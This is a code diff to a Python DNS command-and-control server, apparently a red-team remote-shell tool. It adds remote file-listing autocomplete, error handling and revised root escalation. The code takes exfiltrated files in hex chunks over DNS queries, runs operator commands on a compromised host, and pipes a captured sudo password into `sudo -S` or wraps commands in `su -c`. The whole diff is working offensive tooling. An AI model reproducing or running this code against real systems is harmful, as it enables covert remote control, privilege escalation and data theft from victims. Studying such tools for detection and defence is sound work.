@@ -17,13 +17,19 @@ from sys import argv
 import shlex as oslex
 from neotermcolor import colored
 
+system = None
 responses = {}
 silent = False
 whoami_raw = None
+remote_files = []
+disable_pw = False
+last_prompt = None
 sudo_password = None
 lock = threading.Lock()
 upload_started = False
 upload_pending_chunks = []
+autocomplete_pending = False
+disable_autocomplete = False
 RESPONSE_QUEUE = queue.Queue()
 neotermcolor.readline_always_safe = True
 active_command = {'cmd': None, 'delivered': False}
@@ -40,6 +46,26 @@ banner = r"""
 banner2 = """                                               
   ----------- by @JoelGMSec -----------
 """
+
+def update_remote_files_list():
+    global remote_files, autocomplete_pending, system
+    autocomplete_pending = True
+    if system == "windows":
+        command = "(ls).Name"
+    else:
+        command = "ls"
+    return command
+
+def completer(text, state):
+    global remote_files
+    text_lower = text.lower()
+    options = [f for f in remote_files if f.lower().startswith(text_lower)]
+    if state < len(options):
+        return options[state]
+    return None
+
+readline.set_completer(completer)
+readline.parse_and_bind("tab: complete")
 
 def random_response():
     parts = [random.randint(0, 0xFFFF) for _ in range(8)]
@@ -118,7 +144,7 @@ class DNSHandler(socketserver.BaseRequestHandler):
             return ""
 
     def build_response(self, request, domain):
-        global active_command, responses
+        global active_command, responses, remote_files, autocomplete_pending
 
         tid = request[:2]
         flags = b'\x81\x80'
@@ -189,20 +215,25 @@ class DNSHandler(socketserver.BaseRequestHandler):
                     try:
                         text = bytes.fromhex(fullhex).decode(errors="replace")
                         cmd = active_command.get('cmd','')
-                        file_content = bytes.fromhex(fullhex)
-                        if cmd.startswith('download'):
-                            _, paths = cmd.split(' ',1)
-                            remote_path, local_path = paths.split('!')
-                            os.makedirs(os.path.dirname(local_path), exist_ok=True)
-                            with open(local_path, 'wb') as f:
-                                f.write(file_content)
-                            print(colored(f"[+] File downloaded sucessfully to {local_path}", "green"))
-                            RESPONSE_QUEUE.put("")
-                            active_command = {'cmd': None, 'delivered': False}
+                        
+                        if autocomplete_pending and cmd.strip() in ["ls", "(ls).Name"]:
+                            remote_files = [f.strip() for f in text.strip().split('\n') if f.strip()]
+                            autocomplete_pending = False
                         else:
-                            RESPONSE_QUEUE.put(text)
-                    except:
-                        pass
+                            file_content = bytes.fromhex(fullhex)
+                            if cmd.startswith('download'):
+                                _, paths = cmd.split(' ',1)
+                                remote_path, local_path = paths.split('!')
+                                os.makedirs(os.path.dirname(local_path), exist_ok=True)
+                                with open(local_path, 'wb') as f:
+                                    f.write(file_content)
+                                print(colored(f"[+] File downloaded successfully to {local_path}", "green"))
+                                RESPONSE_QUEUE.put("")
+                                active_command = {'cmd': None, 'delivered': False}
+                            else:
+                                RESPONSE_QUEUE.put(text)
+                    except Exception as e:
+                        print(colored(f"[!] Error processing response: {str(e)}", "red"))
                     responses['chunks'] = []
                 rdata = random_response()
 
@@ -277,7 +308,8 @@ class TCPHandler(socketserver.BaseRequestHandler):
             return ""
 
     def build_response_tcp(self, request, domain):
-        global active_command, responses
+        global active_command, responses, remote_files, autocomplete_pending
+
         tid = request[:2]
         flags = b'\x81\x80'
         counts = b'\x00\x01\x00\x01\x00\x00\x00\x00'
@@ -347,18 +379,24 @@ class TCPHandler(socketserver.BaseRequestHandler):
                     try:
                         text = bytes.fromhex(fullhex).decode(errors="replace")
                         cmd = active_command.get('cmd','')
-                        file_content = bytes.fromhex(fullhex)
-                        if cmd.startswith('download'):
-                            _, paths = cmd.split(' ',1)
-                            remote_path, local_path = paths.split('!')
-                            os.makedirs(os.path.dirname(local_path), exist_ok=True)
-                            with open(local_path, 'wb') as f:
-                                f.write(file_content)
-                            print(colored(f"[+] File downloaded sucessfully to {local_path}", "green"))
+                        
+                        if autocomplete_pending:
+                            remote_files = [f.strip() for f in text.strip().split('\n') if f.strip()]
+                            autocomplete_pending = False
                             RESPONSE_QUEUE.put("")
-                            active_command = {'cmd': None, 'delivered': False}
                         else:
-                            RESPONSE_QUEUE.put(text)
+                            file_content = bytes.fromhex(fullhex)
+                            if cmd.startswith('download'):
+                                _, paths = cmd.split(' ',1)
+                                remote_path, local_path = paths.split('!')
+                                os.makedirs(os.path.dirname(local_path), exist_ok=True)
+                                with open(local_path, 'wb') as f:
+                                    f.write(file_content)
+                                print(colored(f"[+] File downloaded sucessfully to {local_path}", "green"))
+                                RESPONSE_QUEUE.put("")
+                                active_command = {'cmd': None, 'delivered': False}
+                            else:
+                                RESPONSE_QUEUE.put(text)
                     except:
                         pass
                     responses['chunks'] = []
@@ -378,14 +416,16 @@ def clean_whoami(raw):
 
 def get_custom_prompt(root):
     try:
-        global whoami_raw
+        global whoami_raw, system
         whoami = REMOTE_INFO.get("whoami", "user")
         hostname = REMOTE_INFO.get("hostname", "host")
         path = REMOTE_INFO.get("pwd", "~")
 
         if "\\" in path:
+            system = "windows"
             slash = "\\"
         else:
+            system = "linux"
             slash = "/"
 
         path = str(path).rstrip()
@@ -416,10 +456,8 @@ def get_custom_prompt(root):
         pass
 
 def prompt_loop():
-    global active_command
-    global REMOTE_INFO
-    global whoami_raw
-    global silent
+    global active_command, remote_files, autocomplete_pending, system, last_prompt
+    global REMOTE_INFO, whoami_raw, silent, disable_pw, disable_autocomplete
     upload_started = False
     root = False
     sudo = False
@@ -435,8 +473,10 @@ def prompt_loop():
             whoami = clean_whoami(whoami_raw)
             if "\\" in whoami_raw:
                 pwd_cmd = "(pwd).Path"
+                system = "windows"
             else:
                 pwd_cmd = "pwd"
+                system = "linux"
         except:
             pass
 
@@ -458,14 +498,26 @@ def prompt_loop():
         REMOTE_INFO['hostname'] = hostname
         REMOTE_INFO['pwd'] = pwd
 
+        if not disable_autocomplete:
+            with lock:
+                autocomplete_pending = True
+                if system == "windows":
+                    active_command = {'cmd': "(ls).Name", 'delivered': False}
+                else:
+                    active_command = {'cmd': "ls", 'delivered': False}
+            try:
+                RESPONSE_QUEUE.get(timeout=5)
+            except:
+                pass
+
         while True:
             try:
                 command = input(get_custom_prompt(root)).strip()
                 if command == "" or command == None or not command:
-                    print("\n")
+                    print()
 
                 if command.startswith("cd "):
-                    print("\n")
+                    print()
                     current_path = REMOTE_INFO.get("pwd", "~")
                     slash = "\\" if "\\" in current_path else "/"
                     parts = command.strip().split(maxsplit=1)
@@ -512,11 +564,24 @@ def prompt_loop():
                     except:
                         pass
 
+                    if not disable_autocomplete:
+                        with lock:
+                            autocomplete_pending = True
+                            if system == "windows":
+                                active_command = {'cmd': f"(ls \"{REMOTE_INFO['pwd']}\").Name", 'delivered': False}
+                            else:
+                                active_command = {'cmd': f"ls \"{REMOTE_INFO['pwd']}\"", 'delivered': False}
+                        try:
+                            RESPONSE_QUEUE.get(timeout=5)
+                        except:
+                            pass
+
                 else:
                     if command == "exit":
                         if root:
-                            print("\n")
+                            print()
                             REMOTE_INFO['whoami'] = old_user
+                            sudo = False
                             root = False
                             command = None
                         else:
@@ -529,6 +594,11 @@ def prompt_loop():
                         os.system("clear")
                         command = None
 
+                    if "pwd" in command.split()[0]:
+                        pwd_path = str(REMOTE_INFO['pwd']).replace("'","") + "\n"
+                        print(colored(pwd_path, "white"))
+                        command = None
+
                     if command and command.split()[0] == "sudo":
                         if not ":" in pwd_cmd:
                             args = oslex.split(command)
@@ -538,15 +608,14 @@ def prompt_loop():
                             else:
                                 if not sudo:
                                     old_cmd = ' '.join(args[1:])
-                                    print(colored(f"[sudo] password for {str(whoami).rstrip()}:\n\n","red"))
-                                    if not silent:
-                                        sudo_password = pwinput.pwinput(prompt=(get_custom_prompt(root)))
-                                    else:
+                                    print(colored(f"[sudo] password for {str(whoami).rstrip()}:\n","red"))
+                                    if disable_pw or silent:
                                         sudo_password = input(get_custom_prompt(root)).strip()
+                                    else:
+                                        sudo_password = pwinput.pwinput(prompt=(get_custom_prompt(root)))
                                     
                                     if "su" in args:
-                                        print("\n")
-                                        command = f"echo '{sudo_password}' | sudo -S su -c 'whoami'"
+                                        print()
                                         old_user = REMOTE_INFO['whoami']
                                         command = None
                                         root = True
@@ -557,29 +626,23 @@ def prompt_loop():
                                 else:
                                     old_cmd = ' '.join(args[1:])
                                     if "su" in args:
-                                        print("\n")
-                                        command = f"echo '{sudo_password}' | sudo -S su -c 'whoami'"
+                                        print()
                                         old_user = REMOTE_INFO['whoami']
                                         command = None
                                         root = True
+                                        sudo = True
                                     else:
                                         command = f"echo '{sudo_password}' | sudo -S {old_cmd}"
 
                                 if root and "whoami" in command.lower() and cmd_response.strip().lower() == "root":
                                     command = None
 
-                    elif root and command and command not in ["exit", "clear", "cls", "kill", "help"] and not command.startswith("upload") and not command.startswith("download") and not command.startswith("import-ps1"):
-                        if sudo_password:
-                            command = f"echo '{sudo_password}' | sudo -S {command}"
-                        else:
-                            command = f"sudo {command}"
-
                     if command == "supersu":
                         if ":" in pwd_cmd:
                             print(colored("[!] Error: supersu is only available on Linux hosts\n", "red"))
                             command = None
                         else:
-                            print("\n")
+                            print()
                             root = True
                             old_user = REMOTE_INFO['whoami']
                             REMOTE_INFO['whoami'] = "root"
@@ -687,10 +750,10 @@ def prompt_loop():
                                     if final_response.strip():
                                         print(colored(final_response.strip(), "green"))
                                     else:
-                                        print(colored(f"[+] PowerShell script \"{filename}\" imported successfully!\n\n", "green"))
+                                        print(colored(f"[+] PowerShell script \"{filename}\" imported successfully!\n", "green"))
 
                                 except:
-                                    print(colored(f"[+] PowerShell script \"{filename}\" imported successfully!\n\n", "green"))
+                                    print(colored(f"[+] PowerShell script \"{filename}\" imported successfully!\n", "green"))
                                     pass
 
                                 command = None
@@ -712,15 +775,19 @@ def prompt_loop():
                         print(colored("    kill: Kill client connection","blue"))
                         print(colored("    exit: Exit from program\n","blue"))
                         command = None
-                    
+
                     if command != "" and command != None and command:
                         if command == "exit2":
                             print (colored("[!] Exiting..\n", "red"))
                             break
-                            exit(0)
 
-                        if root and not sudo_password:
-                            command = f"su -c '{command}'"
+                        if root and not "cd" in command:
+                            if not sudo:
+                                old_cmd = command
+                                command = f"su -c '{command}'"
+                            else:
+                                old_cmd = command
+                                command = f"echo '{sudo_password}' | sudo -S {old_cmd}"
 
                         with lock:
                             active_command = {'cmd': command, 'delivered': False}
@@ -729,20 +796,19 @@ def prompt_loop():
                             print (colored("[!] Exiting..\n", "red"))
                             try:
                                 cmd_response = RESPONSE_QUEUE.get(timeout=30)
-                                break
-                                exit(0)    
+                                break  
                             except:
                                 break
-                                exit(0)
 
                         else:
                             try:
                                 cmd_response = RESPONSE_QUEUE.get(timeout=360)
-                                if cmd_response:
-                                    print(cmd_response.strip().rstrip()+"\n", end="")
-                                print("\n")
-                            except:
-                                pass
+                                if cmd_response and cmd_response.strip():
+                                    print(cmd_response.strip()+"\n")
+                            except queue.Empty:
+                                print(colored("[!] Error: command timeout", "red"))
+                            except Exception as e:
+                                print(colored(f"[!] Error receiving response: {str(e)}", "red"))
 
             except KeyboardInterrupt:
                 print (colored("\n[!] Exiting..\n", "red"))
@@ -760,6 +826,14 @@ def prompt_loop():
 
 if __name__ == "__main__":
     try:
+        if "-npw" in argv:
+            disable_pw = True
+            argv.remove("-npw")
+            
+        if "-nls" in argv:
+            disable_autocomplete = True
+            argv.remove("-nls")
+
         if not "-silent" in argv:
             print (colored(banner, "blue"))
             print (colored(banner2, "green"))
